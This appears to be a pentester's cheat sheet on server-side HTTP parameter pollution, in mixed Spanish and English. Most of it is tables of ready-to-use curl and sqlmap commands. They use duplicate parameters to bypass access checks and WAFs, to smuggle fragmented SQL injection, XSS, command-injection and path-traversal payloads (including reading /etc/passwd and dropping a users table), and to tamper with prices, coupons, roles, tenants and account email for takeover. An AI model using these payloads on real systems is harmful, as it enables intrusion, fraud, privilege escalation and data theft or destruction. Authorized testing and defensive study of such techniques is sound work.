---
aliases:
  - Server-Side HPP
  - WAF Bypass HPP
  - HPP SQLi
tags:
  - vuln/hpp
  - technique/initial-access
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Parameter Pollution]]"
---
# HPP - Server-Side

***

## Auth / Access Control Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/admin/action?user=admin&user=attacker"` | Front WAF ve `admin` (allowlisted), backend (PHP last-wins) procesa `attacker` → action como atacante | PHP/Ruby last-wins. |
| `curl "https://target/admin?action=read&action=delete"` | Auth check sobre `read`, exec sobre `delete` | Multi-action endpoint. |
| `curl "https://target/admin?role=admin&role=user"` (Java first-wins) | Java toma primero `admin`, backend logic sobre último `user` | Stack differential. |
| `curl -X POST -d "user=admin&user=attacker" https://target/admin/action` | Body HPP variant | Form-encoded body. |
| `curl -H "Cookie: user=admin" "https://target/admin?user=attacker"` | Cookie auth check, query param processed | Source confusion. |
| `curl -X POST -d "_method=DELETE&action=read&action=delete" https://target/admin` | Method override + HPP combo | Compound. |
| `curl "https://target/oauth/authz?state=safe&state=attacker"` | OAuth state confusion | Federation chain. |
| `for combo in 'user=admin&user=attacker' 'user=attacker&user=admin'; do curl "https://target/admin?$combo"; done` | Bulk first/last differential probe | Discovery. |
^hpp-server-auth

___

## WAF / Filter Bypass via Param Split

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'` | ASP.NET concat → `SELECT,*,FROM,users` SQLi fragmented | ASP.NET backend. |
| `curl 'https://target/search?q=<scr&q=ipt>alert(1)</scr&q=ipt>'` | XSS payload fragmented por param split | WAF inspecciona individual values. |
| `curl 'https://target/cmd?c=ls&c=;&c=cat&c=/etc/passwd'` | Command injection fragmented | ASP.NET concat con comma. |
| `curl 'https://target/file?f=..&f=/&f=etc&f=passwd'` | Path traversal fragmented | Stack-specific concat. |
| `curl 'https://target/?q=%3C&q=script%3E&q=alert(1)&q=%3C/script%3E'` | URL-encoded multi-param XSS bypass | Encoding combo. |
| `curl 'https://target/?q=safe&q=<malicious>'` | WAF only inspects first → bypass | First-only WAF. |
| `curl 'https://target/?q=<malicious>&q=safe'` | WAF only inspects last → bypass | Last-only WAF. |
| `for split in 'SELECT&q=*&q=FROM&q=users' 'SELECT *&q= FROM&q= users' 'SE&q=LECT&q= * FROM users'; do curl "https://target/search?q=$split"; done` | Bulk fragmentation probe | WAF testing. |
^hpp-server-waf

### PoC WAF bypass

```bash
# Without HPP — blocked
curl 'https://target/search?q=SELECT * FROM users'
# WAF blocks: SQL injection signature

# With HPP (ASP.NET concatenates)
curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'
# Each individual param benign → WAF no match
# Backend gets "SELECT,*,FROM,users" → executes
```

___

## Logic Flow Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/checkout?step=1&step=3"` | Skip step 2 — multi-step state machine bypass | State validation. |
| `curl "https://target/cart?action=add&action=checkout"` | Skip approval step | Multi-action endpoint. |
| `curl "https://target/order?status=pending&status=approved"` | Bypass review workflow | Approval bypass. |
| `curl "https://target/coupon?code=DISCOUNT10&code=DISCOUNT50"` | Apply ambos coupons | Multi-coupon stack. |
| `curl -X POST -d "qty=1&qty=100" https://target/cart/add` | Quantity manipulation | Stock bypass. |
| `curl -X POST -d "price=100&price=1" https://target/checkout` | Price manipulation | Price field editable. |
| `curl -X POST -d "email=victim@target.com&email=attacker@evil.com" https://target/profile/update` | Email change ATO chain | Profile update HPP. |
| `curl -X POST -d "role=user&role=admin" https://target/users/123` | Role privesc via duplicate | Mass Assignment + HPP. |
| `curl "https://target/api?tenant=A&tenant=B"` | Cross-tenant escape | Multi-tenant logic. |
^hpp-server-logic

___

## SQLi en Hidden Param via Concatenation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/api?id=1&id=' UNION SELECT username,password FROM users-- "` | ASP.NET concat → `1,' UNION SELECT...` SQLi | ASP.NET concat con comma. |
| `sqlmap -u "https://target/api?id=1" --hpp` | sqlmap built-in HPP mode | Auto-explotar. |
| `curl "https://target/api?id=1&id=;DROP TABLE users--"` | Stacked queries via concat | Multi-statement support. |
| `curl "https://target/api?id=1&id=' OR '1'='1"` | Bypass quote filter via fragments | Encoding combo. |
| `curl "https://target/search?q=SELECT&q=username,password&q=FROM&q=users"` | Fragment SQL via espacios | ASP.NET specific. |
| `curl --data-urlencode "id[]=1" --data-urlencode "id[]=' OR 1=1--" https://target/api` | Array notation con SQLi | Java/PHP array. |
^hpp-server-sqli

___

## Mass Assignment Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "name=test&isAdmin=false&isAdmin=true" https://target/users/123` | Last-wins → isAdmin=true persistido | PHP/Ruby last-wins. |
| `curl -X POST -d "role=user&role=admin" https://target/users/123` | Role privesc via duplicate | Mass Assign + HPP. |
| `curl -X POST -H "Content-Type: application/json" -d '{"name":"x","isAdmin":false}' "https://target/users/123?isAdmin=true"` | Body+query HPP | Multi-source merge. |
| `curl -X POST -d "name=x&permissions=read&permissions=write&permissions=admin" https://target/users/123` | Array-style mass assign | Multi-value persistence. |
| `curl -X POST -F "name=x" -F "isAdmin=false" -F "isAdmin=true" https://target/users/123` | Multipart con duplicate | Multipart parser. |
| `{"query":"mutation{update(input:{name:\"x\",role:\"user\",role:\"admin\"}){id}}"}` (GraphQL) | Aliased mutation HPP | GraphQL adjacent. |
| `curl -X POST -d "roles[]=user&roles[]=admin" https://target/users/123` | Array notation HPP | Type-confusion variant. |
^hpp-server-mass-assign

***
